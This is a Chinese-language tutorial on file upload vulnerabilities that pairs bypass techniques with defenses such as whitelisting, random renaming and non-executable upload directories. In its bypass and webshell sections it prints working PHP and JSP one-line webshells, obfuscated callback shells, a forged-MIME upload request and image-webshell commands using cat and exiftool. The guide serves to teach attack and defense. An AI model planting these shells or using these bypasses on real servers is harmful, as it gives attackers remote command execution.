## 1. 文件上传漏洞原理

### 1.1 什么是文件上传漏洞

文件上传漏洞是指 Web 应用对上传文件缺乏充分验证，允许攻击者上传恶意文件（如 WebShell），从而获取服务器控制权。

### 1.2 攻击链

```
1. 发现上传功能 → 尝试上传恶意文件
2. 绕过验证机制 → 成功上传
3. 获取文件路径 → 访问执行
4. 获取服务器权限 → 进一步渗透
```

### 1.3 危害等级

| 危害          | 描述                         |
| ------------- | ---------------------------- |
| WebShell 上传 | 获取命令执行权限             |
| 存储型 XSS    | 上传 HTML/SVG 含恶意脚本     |
| SSRF          | 上传 SVG/HTML 触发服务端请求 |
| DoS           | 上传超大文件耗尽磁盘         |
| 覆盖文件      | 覆盖配置文件或系统文件       |

## 2. 常见验证方式与绕过

### 2.1 客户端验证

**验证方式**：JavaScript 检查文件扩展名。

**绕过**：禁用 JavaScript 或直接构造 HTTP 请求。

### 2.2 MIME 类型验证

**验证方式**：检查 `Content-Type` 头。

```python
# 服务端检查
if file.content_type not in ['image/jpeg', 'image/png']:
    return "Invalid file type"
```

**绕过**：修改请求头：

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← 伪造 MIME 类型

<?php system($_GET['cmd']); ?>
------boundary--
```

### 2.3 扩展名黑名单

**验证方式**：禁止 `.php`、`.asp` 等扩展名。

**绕过方式**：

| 绕过方法    | 示例                                  |
| ----------- | ------------------------------------- |
| 大小写      | `.PhP`、`.pHp`                        |
| 双扩展名    | `.php.jpg`（Apache 解析漏洞）         |
| 特殊扩展名  | `.php3`、`.php4`、`.php5`、`.phtml`   |
| 空字节      | `.php%00.jpg`（旧版本 PHP）           |
| `.htaccess` | 上传自定义解析规则                    |
| 替代语言    | `.jsp`、`.asp`、`.aspx`、`.py`、`.sh` |

**`.htaccess` 上传攻击**：

```apache
# 上传 .htaccess 文件
AddType application/x-httpd-php .jpg

# 之后上传的 .jpg 文件会被当作 PHP 执行
```

### 2.4 扩展名白名单

**验证方式**：仅允许指定扩展名。

**绕过方式**：

| 绕过方法     | 描述                   |
| ------------ | ---------------------- |
| 解析漏洞     | IIS 6.0 `a.asp;.jpg`   |
| CVE 漏洞     | ImageMagick、FFmpeg 等 |
| 二次渲染绕过 | 在图片中嵌入代码       |
| 竞争条件     | 文件被检查前访问       |

### 2.5 文件内容检测

**验证方式**：检查文件头（Magic Bytes）。

| 文件类型 | Magic Bytes   |
| -------- | ------------- |
| JPEG     | `FF D8 FF`    |
| PNG      | `89 50 4E 47` |
| GIF      | `47 49 46 38` |
| PDF      | `25 50 44 46` |

**绕过**：制作图片马：

```bash
# 合并图片和 WebShell
cat image.jpg shell.php > malicious.jpg

# 或在图片 EXIF 中嵌入代码
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

## 3. WebShell 类型

### 3.1 一句话木马

```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### 3.2 常规 WebShell

功能完整的后门程序，提供文件管理、命令执行、数据库操作等。

### 3.3 隐蔽型 WebShell

```php
// 利用回调函数
array_map($_GET['f'], $_GET['a']);

// 利用变量函数
$_GET['f']($_GET['a']);

// 编码混淆
eval(base64_decode($_POST['cmd']));
```

## 4. 文件上传防御

### 4.1 综合防御策略

| 层级 | 措施                        |
| ---- | --------------------------- |
| 前端 | 文件类型提示（仅辅助）      |
| 后端 | 白名单扩展名验证            |
| 后端 | MIME + Magic Bytes 双重验证 |
| 存储 | 重命名文件（随机文件名）    |
| 存储 | 上传目录不可执行            |
| 存储 | 独立存储服务器/对象存储     |
| 内容 | 图片二次渲染                |
| 限制 | 文件大小限制                |

### 4.2 安全上传实现

```python
import os
import uuid
from pathlib import Path

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def safe_upload(file):
    # 1. 扩展名白名单
    ext = Path(file.filename).suffix.lower().lstrip('.')
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("File type not allowed")

    # 2. 文件大小限制
    file.seek(0, 2)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")

    # 3. 随机重命名
    new_filename = f"{uuid.uuid4().hex}.{ext}"

    # 4. 存储到不可执行目录
    upload_dir = "/data/uploads/"  # 配置为不可执行
    filepath = os.path.join(upload_dir, new_filename)

    # 5. 保存文件
    with open(filepath, 'wb') as f:
        f.write(file.read())

    return new_filename
```

### 4.3 Nginx 禁止执行

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

### 4.4 对象存储方案

将上传文件存储到 S3/OSS 等对象存储，通过 CDN 分发，彻底隔离执行环境。
